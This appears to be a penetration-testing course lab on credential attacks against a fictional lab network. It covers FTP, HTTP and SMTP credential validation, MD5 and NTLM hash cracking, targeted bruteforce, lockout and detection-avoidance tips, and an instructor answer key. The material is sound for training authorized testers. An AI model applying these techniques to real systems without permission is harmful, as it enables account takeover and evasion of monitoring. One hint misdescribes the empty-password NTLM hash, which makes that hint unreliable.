# Lab 03: Credential Attacks

**Skill Level**: Intermediate [I]

A hands-on exercise in credential validation, hash cracking, and password attacks.

> **Note**: Complete Labs 01-02 before attempting this lab.

---

## Lab Information

| Attribute | Value |
|-----------|-------|
| Difficulty | Intermediate |
| Time Estimate | 60-90 minutes |
| Prerequisites | Labs 01-02 completed |
| Tools Required | credential-validator, hash-cracker |

## Prerequisites Checklist

Before starting, ensure you:

- [ ] Completed Labs 01 and 02
- [ ] Understand what password hashes are (one-way encrypted passwords)
- [ ] Know basic authentication concepts (username + password)
- [ ] Familiar with FTP and HTTP protocols at a basic level

**Key Terms for This Lab**: Hash, Bruteforce, Dictionary Attack, Credential Stuffing, NTLM (see [Glossary](../GLOSSARY.md))

---

## Objective

Practice credential attack techniques including validating discovered credentials across services, cracking password hashes, and identifying credential reuse vulnerabilities.

---

## Environment Setup

### Lab Network (continued)

```
Network: 10.10.10.0/24
FTP Server: 10.10.10.30
Web Server: 10.10.10.20 (HTTP Basic Auth on /admin)
Mail Server: 10.10.10.25
Domain: corp.local
```

### Discovered Credentials (from Lab 02)

From backup files and configurations:
```
# credentials.txt
admin:Summer2024!
backup:backup123
dbadmin:mysql@dmin
```

### Hash File (recovered from database dump)

```
# hashes.txt
admin:5f4dcc3b5aa765d61d8327deb882cf99
john.doe:e10adc3949ba59abbe56e057f20f883e
jane.smith:d8578edf8458ce06fbc5bb76a58c5ca4
svc_backup:32ed87bdb5fdc5e9cba88547376818d4
```

---

## Scenario

During your assessment of CorpTech Industries, you discovered several potential credentials and a database dump containing password hashes. Your task is to validate these credentials across services and crack the hashes to expand access.

---

## Tasks

### Task 1: Single Credential Validation (Level 1 - Foundation)

**Objective**: Test individual credentials against the FTP service.

**Instructions**:

1. Preview the credential validation:
```bash
python3 /path/to/credential-validator/tool.py 10.10.10.30 \
    --protocol ftp \
    -u admin \
    -P Summer2024! \
    --plan
```

2. Test the credential:
```bash
python3 /path/to/credential-validator/tool.py 10.10.10.30 \
    --protocol ftp \
    -u admin \
    -P 'Summer2024!' \
    --verbose
```

3. Record the result (valid/invalid).

**Deliverable**: Validation result for admin:Summer2024! on FTP

**Validation**: Successfully determine credential validity.

---

### Task 2: Credential File Validation (Level 1 - Foundation)

**Objective**: Test multiple credentials against a service.

**Instructions**:

1. Create a credential file (user:pass format):
```bash
cat > creds.txt << 'EOF'
admin:Summer2024!
backup:backup123
dbadmin:mysql@dmin
test:test
admin:admin
EOF
```

2. Test all credentials against FTP:
```bash
python3 /path/to/credential-validator/tool.py 10.10.10.30 \
    --protocol ftp \
    -c creds.txt \
    --verbose \
    --output task2_ftp.json
```

3. Document all valid credentials.

**Deliverable**: List of valid FTP credentials

**Validation**: Identify at least 2 valid credential pairs.

---

### Task 3: HTTP Authentication Testing (Level 2 - Application)

**Objective**: Test credentials against HTTP Basic Authentication.

**Instructions**:

1. Test against the /admin endpoint:
```bash
python3 /path/to/credential-validator/tool.py 10.10.10.20 \
    --protocol http-basic \
    --http-path /admin \
    -c creds.txt \
    --verbose \
    --output task3_http.json
```

2. If basic auth fails, try form-based:
```bash
python3 /path/to/credential-validator/tool.py 10.10.10.20 \
    --protocol http-form \
    --http-path /login.php \
    --http-user-field username \
    --http-pass-field password \
    --http-success "Welcome" \
    -c creds.txt \
    --verbose
```

**Deliverable**: Valid web application credentials

---

### Task 4: Hash Type Identification (Level 1 - Foundation)

**Objective**: Identify the hash types in the recovered database dump.

**Instructions**:

1. Analyze the hashes:
```bash
# Look at hash length and format
cat hashes.txt
```

2. Use the hash cracker's auto-detection:
```bash
python3 /path/to/hash-cracker/tool.py \
    5f4dcc3b5aa765d61d8327deb882cf99 \
    --plan
```

3. Document identified hash types.

**Reference**:
| Length | Likely Type |
|--------|-------------|
| 32 | MD5 or NTLM |
| 40 | SHA1 |
| 64 | SHA256 |

**Deliverable**: Hash type identification for all hashes

---

### Task 5: Dictionary Attack (Level 2 - Application)

**Objective**: Crack password hashes using dictionary attack.

**Instructions**:

1. Create or use a wordlist:
```bash
# Simple wordlist for lab
cat > wordlist.txt << 'EOF'
password
123456
admin
letmein
welcome
monkey
dragon
master
qwerty
login
password123
admin123
root
toor
EOF
```

2. Perform dictionary attack:
```bash
python3 /path/to/hash-cracker/tool.py \
    -f hashes.txt \
    -w wordlist.txt \
    --verbose \
    --output task5_cracked.json
```

3. Document cracked passwords.

**Deliverable**: List of cracked hashes with plaintext

**Validation**: Crack at least 2 hashes.

---

### Task 6: Rule-Based Attack (Level 2 - Application)

**Objective**: Use password mutation rules to crack remaining hashes.

**Instructions**:

1. Apply common mutations:
```bash
python3 /path/to/hash-cracker/tool.py \
    -f hashes.txt \
    -w wordlist.txt \
    -r capitalize,append_numbers,leet \
    --verbose
```

2. Try year-based mutations:
```bash
python3 /path/to/hash-cracker/tool.py \
    -f hashes.txt \
    -w wordlist.txt \
    -r append_year \
    --verbose
```

3. Document additional cracked passwords.

**Deliverable**: Additional cracked passwords with rule used

---

### Task 7: Credential Reuse Testing (Level 3 - Integration)

**Objective**: Test cracked credentials across all services.

**Instructions**:

1. Compile all discovered/cracked credentials into one file.

2. Test against each service:
```bash
# FTP
python3 /path/to/credential-validator/tool.py 10.10.10.30 \
    --protocol ftp -c all_creds.txt --stop-on-success

# HTTP
python3 /path/to/credential-validator/tool.py 10.10.10.20 \
    --protocol http-basic --http-path /admin -c all_creds.txt

# SMTP
python3 /path/to/credential-validator/tool.py 10.10.10.25 \
    --protocol smtp -c all_creds.txt
```

3. Document credential reuse findings.

**Deliverable**: Credential reuse matrix

**Template**:
```
| Credential | FTP | HTTP | SMTP | SMB |
|------------|-----|------|------|-----|
| admin:X    | Yes | No   | Yes  | No  |
| backup:X   | Yes | Yes  | No   | Yes |
```

---

### Task 8: Targeted Bruteforce (Level 3 - Integration)

**Objective**: Perform targeted bruteforce against specific account.

**Instructions**:

Given intelligence that the svc_backup account uses a password pattern of "Backup" + 4 digits:

1. Design a targeted attack:
```bash
python3 /path/to/hash-cracker/tool.py \
    32ed87bdb5fdc5e9cba88547376818d4 \
    -b \
    --charset "0123456789" \
    --min-length 4 \
    --max-length 4
```

Note: This tests just the numeric portion. You would prepend "Backup" to results.

2. Alternatively, generate a targeted wordlist:
```bash
# Generate Backup0000 to Backup9999
for i in $(seq -w 0000 9999); do echo "Backup$i"; done > backup_wordlist.txt

python3 /path/to/hash-cracker/tool.py \
    32ed87bdb5fdc5e9cba88547376818d4 \
    -w backup_wordlist.txt
```

**Deliverable**: Cracked svc_backup password

---

## Challenge Tasks (Level 4 - Mastery)

### Challenge 1: NTLM Hash Cracking

The following NTLM hash was captured:
```
administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Identify and crack this hash.

### Challenge 2: Optimized Cracking Strategy

Given 1000 hashes and a time limit of 5 minutes, design an optimized cracking strategy that maximizes results.

### Challenge 3: Password Policy Analysis

Based on cracked passwords, identify the likely password policy in use and document recommendations for targeted wordlist creation.

---

## Hints

<details>
<summary>Hint 1: FTP Connection Refused</summary>

Verify the FTP service is running:
```bash
python3 /path/to/port-scanner/tool.py 10.10.10.30 --ports 21
```
</details>

<details>
<summary>Hint 2: HTTP Form Authentication Not Working</summary>

Check the actual form field names by viewing page source. Common variations:
- user, username, email, login
- pass, password, passwd, pwd
</details>

<details>
<summary>Hint 3: Hash Not Cracking</summary>

Verify hash type is correctly identified. Try explicitly specifying:
```bash
python3 tool.py <hash> -t md5 -w wordlist.txt
```
</details>

<details>
<summary>Hint 4: Account Lockout</summary>

Use delays to avoid lockout:
```bash
python3 tool.py <target> --protocol ftp -c creds.txt \
    --delay-min 2 --delay-max 5 --threads 1
```
</details>

<details>
<summary>Hint 5: NTLM Hash Format</summary>

NTLM hash is the second part after the LM hash:
`31d6cfe0d16ae931b73c59d7e0c089c0`

A hash of all zeros (31d6cfe0...) is an empty password!
</details>

---

## Solution Guide

<details>
<summary>Click to reveal solution (Instructor Use)</summary>

### Task 1-2 Solution

Valid FTP credentials:
- admin:Summer2024! (valid)
- backup:backup123 (valid)
- dbadmin:mysql@dmin (invalid - wrong service)

### Task 3 Solution

```bash
python3 /path/to/credential-validator/tool.py 10.10.10.20 \
    --protocol http-basic \
    --http-path /admin \
    -c creds.txt
```

Valid: admin:Summer2024!

### Task 4-5 Solution

Hash analysis:
- All hashes are 32 characters = MD5
- 5f4dcc3b5aa765d61d8327deb882cf99 = password
- e10adc3949ba59abbe56e057f20f883e = 123456
- d8578edf8458ce06fbc5bb76a58c5ca4 = qwerty

### Task 6 Solution

With rules:
- svc_backup hash with append_year: Backup2024

### Task 7 Solution

Credential Reuse Matrix:
| Credential | FTP | HTTP | SMTP |
|------------|-----|------|------|
| admin:Summer2024! | Yes | Yes | Yes |
| backup:backup123 | Yes | No | No |

### Challenge 1 Solution

31d6cfe0d16ae931b73c59d7e0c089c0 = empty password (known hash)

</details>

---

## Assessment Criteria

| Criteria | Points | Description |
|----------|--------|-------------|
| Single Credential Testing | 10 | Correct validation |
| Multi-Credential Testing | 15 | All valid creds found |
| HTTP Authentication | 15 | Web creds identified |
| Hash Identification | 10 | Correct type ID |
| Dictionary Attack | 20 | Hashes cracked |
| Rule-Based Attack | 15 | Additional cracks |
| Credential Reuse | 15 | Complete matrix |

**Total: 100 points**

---

## Operational Security Notes

### What Gets Logged

| Action | Log Location |
|--------|--------------|
| FTP login attempts | FTP server logs |
| HTTP auth failures | Web server logs |
| SMTP auth attempts | Mail server logs |
| Multiple failures | Security monitoring |

### Avoiding Detection

- Use appropriate delays between attempts
- Limit thread count
- Stop on success to minimize attempts
- Test during expected activity hours

---

## Cleanup

```bash
# Remove credential files
rm -f creds.txt all_creds.txt wordlist.txt backup_wordlist.txt

# Remove output files
rm -f task*.json

# Clear sensitive data from memory (close terminal)
```

---

## Next Lab

Proceed to **Lab 04: Payload Delivery** to learn how to use valid credentials for access and payload deployment.
